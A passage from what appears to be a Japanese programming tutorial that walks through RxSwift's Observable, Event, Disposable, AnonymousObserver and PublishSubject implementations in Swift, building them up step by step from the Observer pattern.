    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">notify</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="n">E</span><span class="p">)</span> <span class="p">{</span> <span class="n">handler</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nv">observable</span> <span class="p">=</span> <span class="n">BooleanObservable</span><span class="p">()</span>
<span class="kd">var</span> <span class="nv">observer</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;(</span><span class="n">handler</span><span class="p">:</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">NSLog</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="p">})</span>

<span class="n">observable</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">false</span>   <span class="c1">//=&gt; ログ出力されない</span>
<span class="n">observable</span><span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">observer</span><span class="p">)</span>
<span class="n">observable</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">true</span>   <span class="c1">//=&gt; ログ出力される</span>
<span class="n">observable</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">false</span>  <span class="c1">//=&gt; ログ出力される</span>
<span class="n">observable</span><span class="p">.</span><span class="n">unsubscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">observer</span><span class="p">)</span>
<span class="n">observable</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">true</span>   <span class="c1">//=&gt; ログ出力されない</span>
</pre></div>
</div>

<p>　こうして、私たちは「通知元の状態変化を、複数の通知先に伝えたい」という問題を解決する実装パターンである <strong>push 型 Observer パターン</strong>を手にすることができました。 protocol が型パラメータを持てないという制約を回避するためにやや遠回りで苦しい実装をしましたが、構造的には C# のものと同じです。</p>

<h1>
<span id="3-rxswift-の-observer-observable-の実装" class="fragment"></span><a href="#3-rxswift-%E3%81%AE-observer-observable-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>3. RxSwift の Observer, Observable の実装</h1>

<p>　さて、ここからはいよいよ RxSwift の <code>Observable</code> についてみていきます。基本的に push 型 Observer パターンと同じ構造になりますが、3つ異なる点があります。</p>

<ol>
<li>notify 時に値を <code>.next</code>, <code>.error</code>, <code>.completed</code> という文脈につつむ enum <code>Event</code> にラップして渡している</li>
<li>
<code>.next</code> 以外の値が飛んだ場合に、以後イベントは飛ばなくなる</li>
<li>
<code>unsubscribe</code> の責務を <code>Disposable</code> に分離している</li>
</ol>

<p>まずは前者から見ていきましょう。</p>

<p><a href="https://camo.qiitausercontent.com/d952650ccf102192393fae3948290d165604d603/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f61623635396666372d383739622d646538382d353430642d3632383565343030396161372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d952650ccf102192393fae3948290d165604d603/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f61623635396666372d383739622d646538382d353430642d3632383565343030396161372e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/ab659ff7-879b-de88-540d-6285e4009aa7.png"></a></p>

<h2>
<span id="31-event-の実装" class="fragment"></span><a href="#31-event-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>3.1. Event の実装</h2>

<p>　<strong>RxSwift の <code>Observable</code> は変化した値(next)に加えて、エラー(error)と完了(completed)という文脈を <code>Observer</code> に通知することができます。</strong>その文脈を表現するのが <code>Event</code> という enum です。実装が単純なので、コードをみたほうが理解がはやいでしょう。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Event.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">enum</span> <span class="nc">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">next</span><span class="p">(</span><span class="n">Element</span><span class="p">)</span>
    <span class="k">case</span> <span class="n">error</span><span class="p">(</span><span class="n">Error</span><span class="p">)</span>
    <span class="k">case</span> <span class="n">completed</span>
<span class="p">}</span>
</pre></div>
</div>

<p>また通知に関してもう一つだけ push 型　Observerパターンにはないルールがあります。それは <strong>「<code>next</code> 以外の値が飛んだ場合に、以後イベントは飛ばなくなる」</strong>というルールです。これは RxSwift のソースコード内で以下のように表現されています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">EventExtension.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">extension</span> <span class="nc">Event</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">var</span> <span class="nv">isStopEvent</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="kc">self</span> <span class="p">{</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">next</span><span class="p">:</span> <span class="k">return</span> <span class="kc">false</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">error</span><span class="p">,</span> <span class="p">.</span><span class="n">completed</span><span class="p">:</span> <span class="k">return</span> <span class="kc">true</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="32-disposable-プロトコルの定義" class="fragment"></span><a href="#32-disposable-%E3%83%97%E3%83%AD%E3%83%88%E3%82%B3%E3%83%AB%E3%81%AE%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>3.2. Disposable プロトコルの定義</h2>

<p>　続いて <code>Disposable</code> プロトコルの定義についてみていきましょう。これも先に見た push 型の Observer パターンには存在しないものになります。このプロトコルは単純に<strong>「push 型の Observer パターンの <code>unsubscribe</code> の役割をオブジェクトとして切り出した」</strong>ものになります。したがって、<code>unsubscribe</code> を発火させる単純なメソッド <code>dispose</code> のみを持つシンプルなインターフェースとなります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Disposable.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">Disposable</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">dispose</span><span class="p">()</span>
<span class="p">}</span>
</pre></div>
</div>

<p>このプロトコルの実装（具体的には <code>SubscriptionDisposable</code> など）については、ReactiveExtensions の <code>Observable</code> の本質とは少し離れ、かなり Swift という言語やメモリモデルに依存したものになるため、ひとまず後回しにして他の実装をみていくことにしましょう。</p>

<h2>
<span id="33-observertype-observabletype-プロトコルの定義" class="fragment"></span><a href="#33-observertype-observabletype-%E3%83%97%E3%83%AD%E3%83%88%E3%82%B3%E3%83%AB%E3%81%AE%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>3.3. ObserverType, ObservableType プロトコルの定義</h2>

<p>ObserverType, ObservableType プロトコルの定義については、ほとんど push 型の Observer パターンとかわりありません。変化しているのは「値がイベントという文脈付きで通知される」という点だけです。文脈がついているため、いままで <code>notify</code> と命名していた箇所が <code>on</code> という名前に変わっています。これは、引数に enum 値として <code>.next(Element)</code>, <code>.error(Error)</code>, <code>.completed</code> が渡ると考えると自然な命名ですね。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">ObserverObservable.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">ObservableType</span> <span class="p">{</span>
    <span class="n">associatedtype</span> <span class="n">E</span>
    <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="kc">_</span> <span class="n">observer</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Disposable</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">ObserverType</span> <span class="p">{</span>
    <span class="n">associatedtype</span> <span class="n">E</span>
    <span class="kd">func</span> <span class="nf">on</span><span class="p">(</span><span class="kc">_</span> <span class="n">event</span><span class="p">:</span> <span class="n">Event</span><span class="p">&lt;</span><span class="n">E</span><span class="p">&gt;)</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　また、<code>ObserverType</code> には便利な拡張メソッドとして <code>onNext(Element)</code>, <code>onError(Error)</code>, <code>onCompleted</code> が生えています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">ObserverExtensions.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">extension</span> <span class="nc">ObserverType</span> <span class="p">{</span>    
    <span class="kd">public</span> <span class="kr">final</span> <span class="kd">func</span> <span class="nf">onNext</span><span class="p">(</span><span class="kc">_</span> <span class="n">element</span><span class="p">:</span> <span class="n">E</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">on</span><span class="p">(.</span><span class="n">next</span><span class="p">(</span><span class="n">element</span><span class="p">))</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kr">final</span> <span class="kd">func</span> <span class="nf">onCompleted</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">on</span><span class="p">(.</span><span class="n">completed</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kr">final</span> <span class="kd">func</span> <span class="nf">onError</span><span class="p">(</span><span class="kc">_</span> <span class="n">error</span><span class="p">:</span> <span class="n">Swift</span><span class="p">.</span><span class="n">Error</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">on</span><span class="p">(.</span><span class="n">error</span><span class="p">(</span><span class="n">error</span><span class="p">))</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="34-observable-の実装" class="fragment"></span><a href="#34-observable-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>3.4. Observable の実装</h2>

<p>　つづいて Observable の実装についてみていきましょう。 基本的に <code>ObservableType</code> の関連型（associated type）を、型パラメータに引き上げる以外のことはやっていません。Swift には抽象クラスや抽象メソッドという言語機能が存在しないため、その意志を込めて <code>Never</code> 型を返すメソッドを呼び出しているのが特徴的です。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Observable.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Observable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span> <span class="n">ObservableType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">E</span> <span class="p">=</span> <span class="n">Element</span>

    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="kc">_</span> <span class="n">observer</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Disposable</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span> <span class="p">{</span>
        <span class="n">abstractMethod</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">/// 抽象メソッドを表現するための苦肉の策</span>
<span class="kd">func</span> <span class="nf">abstractMethod</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">Never</span> <span class="p">{</span>
    <span class="bp">fatalError</span><span class="p">(</span><span class="s">"abstract method"</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="35-anonymousobserver-の実装" class="fragment"></span><a href="#35-anonymousobserver-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>3.5. AnonymousObserver の実装</h2>

<p><code>AnonymousObserver</code> に関しても push 型 Observer パターンをベースに<strong>「<code>next</code> 以外の値が飛んだ場合に、以後イベントは飛ばなくなる」</strong>というルールが追加した実装に変更します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">AnonymousObserver.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">AnonymousObserver</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span> <span class="n">ObserverType</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">E</span> <span class="p">=</span> <span class="n">Element</span>
    <span class="kd">typealias</span> <span class="n">EventHandler</span> <span class="p">=</span> <span class="p">(</span><span class="n">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;)</span> <span class="p">-&gt;</span> <span class="nb">Void</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">eventHandler</span><span class="p">:</span> <span class="n">EventHandler</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">isStopped</span><span class="p">:</span> <span class="nb">Int32</span> <span class="p">=</span> <span class="mi">0</span> <span class="c1">//=&gt; means AtomicInt</span>

    <span class="kd">public</span> <span class="kd">init</span><span class="p">(</span><span class="kc">_</span> <span class="n">eventHandler</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="n">EventHandler</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">eventHandler</span> <span class="p">=</span> <span class="n">eventHandler</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">on</span><span class="p">(</span><span class="kc">_</span> <span class="n">event</span><span class="p">:</span> <span class="n">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">next</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">isStopped</span> <span class="p">==</span> <span class="mi">0</span> <span class="p">{</span> <span class="n">eventHandler</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">}</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">error</span><span class="p">,</span> <span class="p">.</span><span class="n">completed</span><span class="p">:</span>
            <span class="k">if</span> <span class="o">!</span><span class="n">OSAtomicCompareAndSwap32Barrier</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">&amp;</span><span class="n">isStopped</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="p">}</span>
            <span class="n">eventHandler</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　Swift では <code>Bool</code> を参照し、条件次第で異なる値を代入する操作はアトミックではないため、その代わりのフラグとして <code>Int32</code> が利用されています。また、 <code>OSAtomicCompareAndSwap32Barrier</code> は、値と変数を比較して等しい場合に、新しい値を代入する操作をアトミックに行うものです。この場合 <code>isStopped</code> が 0 と等しいか比較をして真であれば 1 に差し替えるという操作をアトミックに行います。このあたりは <code>AnonymousObserver</code> の本質的な部分でないため、難しければ理解しなくても大丈夫です。</p>

<h2>
<span id="36-rxswift-の-observable-についてのまとめ" class="fragment"></span><a href="#36-rxswift-%E3%81%AE-observable-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>3.6. RxSwift の Observable についてのまとめ</h2>

<p>　歴史的経緯はどうだったのか知りませんが、Rx の基本的なインターフェースである <code>Observable</code>, <code>Observer</code> については以下のように説明できると思います（※筆者は歴史的経緯は知らないので実際の流れは違うかもしれません）。</p>

<ol>
<li>push 型 Observer パターンが基本的な出発点</li>
<li>通知する値に <code>.next</code>, <code>.error</code>, <code>.completed</code> という文脈をつけた <code>Event</code> が通知の対象物になっているのが特徴的</li>
<li>また <code>.next</code> 以外の値が通知されると以降、イベントは送られない（ストリームが閉じる）</li>
<li>購読解除の仕組みを <code>Disposable</code> に分離しているのが特徴的</li>
</ol>

<p>　以上を踏まえると <code>Observable</code>, <code>Observer</code> といったインターフェースを自然に導き出すことができると思います。ここまでくれば、<code>Observable</code> はもはや「川」といったあいまいなものではなく、よりビビッドに振る舞いを捉えることができるようになっているのではないでしょうか。</p>

<h1>
<span id="4-subject-と-disposable-を実装する" class="fragment"></span><a href="#4-subject-%E3%81%A8-disposable-%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>4. Subject と Disposable を実装する</h1>

<p>　これまで観測可能な値(<code>Observable</code>)と、その状態変化を観測するオブジェクト(<code>Observer</code>)について詳しく見てきましたが、ReactiveExtensions にはそのどちらの役割も持つオブジェクトが存在します。それが、<code>Subject</code> です。代表的なものに <code>BehaviorSubject</code>, <code>PublishSubject</code> などがあります。</p>

<p>　<code>Observable</code> であり、かつ <code>Observer</code> であるということは単純に以下のような <code>SubjectType</code> プロトコルに落とし込むことができます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">SubjectType.swift</span></div>
<div class="highlight"><pre><span></span><span class="c1">// 通知元にも通知先にもなりうるオブジェクトを表す</span>
<span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">SubjectType</span><span class="p">:</span> <span class="n">ObservableType</span> <span class="p">{</span> <span class="c1">// 普段は Observable としてふるまう</span>
    <span class="kd">typealias</span> <span class="n">SubjectObserverType</span><span class="p">:</span> <span class="n">ObserverType</span>

    <span class="kd">func</span> <span class="nf">asObserver</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">SubjectObserverType</span> <span class="c1">// 必要なときに SubjectObserverType に変換できる</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="41-publishsubject-のふるまい" class="fragment"></span><a href="#41-publishsubject-%E3%81%AE%E3%81%B5%E3%82%8B%E3%81%BE%E3%81%84"><i class="fa fa-link"></i></a>4.1. PublishSubject のふるまい</h2>

<p>　<code>Observable</code> は、 <code>subscribe(Observer)</code> メソッドによって受け入れた <code>Observer</code> にイベント発生時に通知をするという働きをします。 <code>Observer</code> は発生したイベント値の通知を受け入れる <code>on(Event&lt;T&gt;)</code> というメソッドを持っています。</p>

<p>　<code>PublishSubject</code> は <code>Subject</code> であるため、 <code>on(Event&lt;T&gt;)</code> と <code>subscribe(Observer)</code> 双方のメソッドを持っています。ベーシックな使い方としては、 <code>PublishSubject</code> にあらかじめ <code>Observer</code> を <code>Subscribe</code> させておき、<code>on(Event&lt;T&gt;)</code> を読んだときに通知させるというものになります。これは先にみてきた Observer パターンと全く同じ構図になります。 <code>PublishSubject</code> というと得体の知れないものに聞こえるかも知れませんが、実態はこれまで散々見てきた Observer パターンのなかの Observable 具象クラスそのものと同じ立ち位置であるといえば、わかりやすいのではないかと思います。実際に動かしたいコードのイメージは以下のようになります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PublishSubjectClientCode.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nv">isHoge</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;()</span>
<span class="kd">var</span> <span class="nv">observer</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;({</span> <span class="n">event</span> <span class="k">in</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">next</span><span class="p">(</span><span class="kd">var</span> <span class="nv">value</span><span class="p">):</span> <span class="n">NSLog</span><span class="p">(</span><span class="nb">String</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="kd">var</span> <span class="nv">error</span><span class="p">):</span> <span class="n">NSLog</span><span class="p">(</span><span class="n">error</span><span class="p">.</span><span class="n">localizedDescription</span><span class="p">)</span>
    <span class="k">case</span> <span class="p">.</span><span class="n">completed</span><span class="p">:</span> <span class="n">NSLog</span><span class="p">(</span><span class="s">"completed"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">})</span>
<span class="kd">var</span> <span class="nv">disopsable</span> <span class="p">=</span> <span class="n">isHoge</span><span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">observer</span><span class="p">)</span>
<span class="n">isHoge</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">Event</span><span class="p">.</span><span class="n">next</span><span class="p">(</span><span class="kc">true</span><span class="p">))</span>   <span class="c1">//=&gt; [LOG] `true`</span>
<span class="n">isHoge</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">Event</span><span class="p">.</span><span class="n">next</span><span class="p">(</span><span class="kc">false</span><span class="p">))</span>  <span class="c1">//=&gt; [LOG] `false`</span>
<span class="n">disopsable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
<span class="n">isHoge</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">Event</span><span class="p">.</span><span class="n">next</span><span class="p">(</span><span class="kc">true</span><span class="p">))</span>   <span class="c1">//=&gt; ログ出力されない</span>
</pre></div>
</div>

<p>　push 型 Observer パターンでもみた風景ですね。これを実現するためには素直に Observable のインターフェースを実装していけば良いはずなので、書き出しは以下のような形になるかと思います。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PublishSubjectBeta.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;,</span> <span class="n">SubjectType</span><span class="p">,</span> <span class="n">ObserverType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">SubjectObserverType</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span>
    <span class="kd">var</span> <span class="nv">observers</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">:</span><span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;]</span> <span class="p">=</span> <span class="p">[:]</span>

    <span class="kd">public</span> <span class="kr">override</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">&gt;</span>
    <span class="p">(</span><span class="kc">_</span> <span class="n">observer</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Disposable</span> <span class="k">where</span> <span class="n">O</span> <span class="p">:</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">Element</span> <span class="p">{</span>
        <span class="c1">// dictionary にしないと O : ObserverType, O.E == Element が</span>
        <span class="c1">// Equatable じゃないので削除（unsubscribe）できなくなる</span>
        <span class="kd">let</span> <span class="nv">key</span> <span class="p">=</span> <span class="n">UUID</span><span class="p">().</span><span class="n">uuidString</span>
        <span class="n">observers</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">(</span><span class="n">observer</span><span class="p">.</span><span class="n">on</span><span class="p">)</span>
        <span class="bp">fatalError</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">on</span><span class="p">(</span><span class="kc">_</span> <span class="n">event</span><span class="p">:</span> <span class="n">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;)</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">x</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">asObserver</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">self</span> <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　ほぼ push 型 Observer パターンのときと同様です。しかしながら、まだ <code>Disposable</code> の具象クラスを実装していないため、<code>subscribe</code> の戻り値を生成できず、ひとまず <code>Never</code> 型を返す <code>fatalError</code> をよんでいます。直近の課題は、<code>subscribe</code> で返すべき <code>SubscriptionDisposable</code> というクラスを実装するというものになります。</p>

<h2>
<span id="42-subscriptiondisposable-の実装" class="fragment"></span><a href="#42-subscriptiondisposable-%E3%81%AE%E5%AE%9F%E8%A3%85"><i class="fa fa-link"></i></a>4.2 SubscriptionDisposable の実装</h2>

<p>　ここでの <code>Disposable</code> の責務は端的に言えば 「<code>unsubscribe</code> を呼び出す」というものになります。したがってまず、<code>PublishSubject</code> 自体に <code>unsubscribe</code> メソッドを生やしてしまいましょう。外部へは <code>Disposable</code> プロトコルで渡るため、internal スコープ内に <code>unsubscribe</code> メソッドを持つことを伝えるための <code>UnsubscribeType</code> というプロトコルも同時に切ると、以下のような形になります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PublishSubjectBeta2.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">UnsubscribeType</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span>
<span class="n">Observable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;,</span> <span class="n">SubjectType</span><span class="p">,</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">UnsubscribeType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">SubjectObserverType</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span>
    <span class="kd">var</span> <span class="nv">observers</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">:</span><span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;]</span> <span class="p">=</span> <span class="p">[:]</span>

    <span class="kd">public</span> <span class="kr">override</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">&gt;</span>
    <span class="p">(</span><span class="kc">_</span> <span class="n">observer</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Disposable</span> <span class="k">where</span> <span class="n">O</span> <span class="p">:</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">Element</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">key</span> <span class="p">=</span> <span class="n">UUID</span><span class="p">().</span><span class="n">uuidString</span>
        <span class="n">observers</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">(</span><span class="n">observer</span><span class="p">.</span><span class="n">on</span><span class="p">)</span>
        <span class="c1">//=&gt; unsubscribe が以下のように実装されたので、key と 自分自身への弱参照を保持するオブジェクトを返せばよい</span>
        <span class="bp">fatalError</span><span class="p">()</span> 
    <span class="p">}</span>

    <span class="kd">internal</span> <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="nb">String</span><span class="p">)</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">removeValue</span><span class="p">(</span><span class="n">forKey</span><span class="p">:</span> <span class="n">key</span><span class="p">)</span> <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">on</span><span class="p">(</span><span class="kc">_</span> <span class="n">event</span><span class="p">:</span> <span class="n">Event</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;)</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">x</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">on</span><span class="p">(</span><span class="n">event</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>    
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">asObserver</span><span class="p">()</span> <span class="p">-&gt;</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">self</span> <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>　<code>unsubscribe</code> がこのように実装されたため、<code>subscribe</code> ではこのオブジェクトへの弱参照と、引数で受け入れた observer に対応するキーを保持したオブジェクトを作ればよいことになります。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">SubscriptionDisposable.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">struct</span> <span class="nc">SubscriptionDisposable</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;:</span> <span class="n">Disposable</span> <span class="p">{</span>
